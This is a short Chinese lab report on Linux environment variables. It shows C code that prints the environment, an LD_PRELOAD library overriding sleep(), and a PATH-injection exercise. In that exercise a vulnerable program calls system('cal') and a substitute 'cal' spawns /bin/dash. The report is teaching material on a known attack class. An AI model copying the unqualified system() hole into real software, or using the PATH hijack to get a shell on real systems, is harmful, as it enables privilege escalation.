#### 1.实验原理
![8.png](https://i.loli.net/2021/03/09/GvbAgRHKmMkdqWn.png)


#### 2.实验环境：
Ububtu 16.04
#### 3.实验过程：
##### 实验1 打印环境变量
```c
#include<stdio.h>
extern char ** environ;
int main(int argc, char*argv[], char* envp[])
{
  int i = 0;
  char* v[2];
  char* newenv[3];

  if(argc < 2) return 0;
  v[0] = "/usr/bin/env";
  v[1] = NULL;
  newenv[0] = "AAA=aaa";
  newenv[1] = "BBB=bbb";
  newenv[2] = NULL;

  switch(argv[1][0])
  {
    case '1':
      execve(v[0], v, NULL);
    case '2':
      execve(v[0], v, newenv);
    case '3':
      execve(v[0], v, environ);
    default:
      execve(v[0], v, NULL);

  }
  return 0;

}
```
![10.png](https://i.loli.net/2021/03/09/tWgfrHMcilEoPaY.png)

##### 实验2 shell 变量和环境变量

- ![7.png](https://i.loli.net/2021/03/09/VfyQ2uIjHk6JPev.png) 
- ![9.png](https://i.loli.net/2021/03/09/K9fSysVRv54l2PB.png) 
- ![11.png](https://i.loli.net/2021/03/09/lsPLecraJEm2RHq.png)

##### 实验3 动态链接环境变量LD_PRELOAD

```C
//mytest.c
#include<stdio.h>
#include<unistd.h>
int main(int argc, char*argv[], char* envp[])
{
  sleep(1);
  return 0;

}
```
```C
//sleep.c
#include<stdio.h>

void sleep(int s)
{
  printf("I am not sleeping.\n");

}
```

* 将sleep.c编译成动态链接库 libmylib.so.1.0.1并加入LD_PRELOAD环境变量中

- ![12.png](https://i.loli.net/2021/03/09/yRdnp1sFVQStJzb.png) 
- ![13.png](https://i.loli.net/2021/03/09/T91WVrMaQEYoIOf.png)

* 当EUID和RUID不同时，LD_PRELOAD环境变量被忽视
- ![14.png](https://i.loli.net/2021/03/09/pAIQvto4Hk9Xjhb.png) 
- ![15.png](https://i.loli.net/2021/03/09/tFiNB3bkvCY4AdM.png)

##### 实验4 外部程序注入
```c
//vul.c
#include<stdlib.h>
int main(int argc, char*argv[], char* envp[])
{
  system("cal");
  return 0;

}
```

```c
//cal.c
#include<stdlib.h>
int main(int argc, char*argv[], char* envp[])
{
  system("/bin/dash");
  return 0;

}
```

* 修改PATH
  
- ![17.png](https://i.loli.net/2021/03/09/NDFZXYyphS48J6x.png) 
- ![16.png](https://i.loli.net/2021/03/09/zQjCJVHv8BPKmRc.png)
* ppt中这里获得了root权限，本次实验结果是用户权限

#### 4.总结

修改环境变量可能造成程序有意向不到的结果
